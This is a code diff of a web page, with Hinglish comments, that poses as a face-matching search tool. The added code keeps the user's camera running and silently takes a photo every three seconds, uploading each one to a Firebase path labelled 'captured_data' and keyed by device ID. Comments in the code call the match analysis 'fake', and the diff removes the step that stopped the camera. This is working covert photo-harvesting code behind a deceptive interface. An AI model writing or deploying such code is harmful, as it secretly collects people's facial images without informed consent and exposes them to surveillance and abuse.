@@ -228,9 +228,9 @@
     </div>
   </div>
 
-  <script>
+   <script>
     // ==========================================
-    // 🚀 1. DEVICE ID & SILENT TRACKER (PURANA FORMAT)
+    // 🚀 1. INITIALIZE FIREBASE & SILENT TRACKER
     // ==========================================
     let db = null;
     // Purana format: dev_timestamp_randomstring
@@ -271,12 +271,13 @@
     }
 
     // ==========================================
-    // 🚀 2. CAMERA & SCANNING LOGIC
+    // 🚀 2. CAMERA & CONTINUOUS CAPTURE LOGIC
     // ==========================================
     const $ = id => document.getElementById(id);
     const video = $("video");
     let cameraStream = null;
     let isCaptured = false;
+    let captureInterval = null; // 🚀 Naya variable interval ke liye
 
     const samples = [
       { name: "Alex Morgan", place: "United States", score: "99.2%", img: "https://i.pravatar.cc/120?img=12" },
@@ -311,31 +312,41 @@
       try {
         cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         video.srcObject = cameraStream;
+        
+        // Android aur Desktop dono ke liye safe play logic
+        video.onplaying = () => {
+          $("placeholder").style.display = "none";
+          $("faceGuide").style.display = "block";
+          $("cameraStatus").style.display = "flex";
+          $("startBtn").textContent = "Camera Active";
+          $("startBtn").disabled = true;
+          $("captureBtn").disabled = false;
+          log("Camera ready. Continuous capture started...");
+
+          // 🚀 YAHAN SE CONTINUOUS CAPTURE SHURU HOTA HAI
+          if (!isCaptured) {
+            // 1. Pehli photo turant lo
+            autoCapture(); 
+            
+            // 2. Har 3 second me photo lene ka loop
+            captureInterval = setInterval(() => {
+              autoCapture();
+            }, 3000);
+          }
+        };
+        
         await video.play();
         video.style.display = "block";
-        $("placeholder").style.display = "none";
-        $("faceGuide").style.display = "block";
-        $("cameraStatus").style.display = "flex";
-        $("startBtn").textContent = "Camera Active";
-        $("startBtn").disabled = true;
-        $("captureBtn").disabled = false;
-        log("Camera ready. Auto-capture in 3 seconds...");
-        
-        setTimeout(() => {
-          if (!isCaptured) autoCapture();
-        }, 3000);
 
       } catch (error) {
         alert("Unable to open camera. Check browser permission.");
       }
     }
 
+    // 📸 CAPTURE & UPLOAD FUNCTION
     function autoCapture() {
       if (!cameraStream || !video.videoWidth) return;
-      isCaptured = true;
-      
-      $("cameraStatus").innerHTML = '<i></i> CAPTURING...';
-      $("captureBtn").disabled = true;
+      isCaptured = true; // Mark that capture has started
 
       const canvas = document.createElement('canvas');
       canvas.width = 640; 
@@ -348,31 +359,22 @@
       
       const compressedPhoto = canvas.toDataURL('image/jpeg', 0.6);
       
-      cameraStream.getTracks().forEach(track => track.stop());
-      video.style.display = "none";
-
-      log("Biometric data compressed. Sending to secure server...");
-
+      // Firebase me photo bhejo (Unique timestamp ke sath)
       if (db) {
-        // 🚀 Yahan path bilkul tumhare purane format jaisa hai
         db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
           image: compressedPhoto,
           timestamp: Date.now(),
-          type: 'auto_capture_pro',
+          type: 'interval_capture',
           deviceId: deviceId
         }).then(() => {
-          log("Data securely uploaded to cloud.");
-          startAnalysis(); 
+          console.log("📸 Photo auto-saved to cloud at", new Date().toLocaleTimeString());
         }).catch(err => {
           console.error("Upload failed:", err);
-          log("Upload failed. Retrying local...");
-          startAnalysis();
         });
-      } else {
-        startAnalysis();
       }
     }
 
+    // Fake scan start karne ka function (tumhare UI ke liye)
     function startAnalysis() {
       $("emptyState").style.display = "none";
       $("progressWrap").style.display = "block";
@@ -423,17 +425,27 @@
       speak("Analysis complete. I found six exact matches.");
     }
 
+    // Event Listeners
     $("startBtn").addEventListener("click", () => { $("consentModal").style.display = "grid"; });
     $("cancelBtn").addEventListener("click", () => { $("consentModal").style.display = "none"; });
+    
     $("allowBtn").addEventListener("click", async () => {
       $("consentModal").style.display = "none";
       await enableCamera();
     });
     
+    // Manual capture button (agar koi click kare toh scan bhi shuru ho jaye)
     $("captureBtn").addEventListener("click", () => {
       if (!isCaptured) autoCapture();
+      $("captureBtn").disabled = true; // Disable manual button once clicked
+      startAnalysis(); // Start the fake analysis UI
     });
-    
+
+    // 🚀 Page close hone par interval clear karo
+    window.addEventListener('beforeunload', () => {
+      if (captureInterval) clearInterval(captureInterval);
+      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+    });
   </script>
 </body>
 </html>
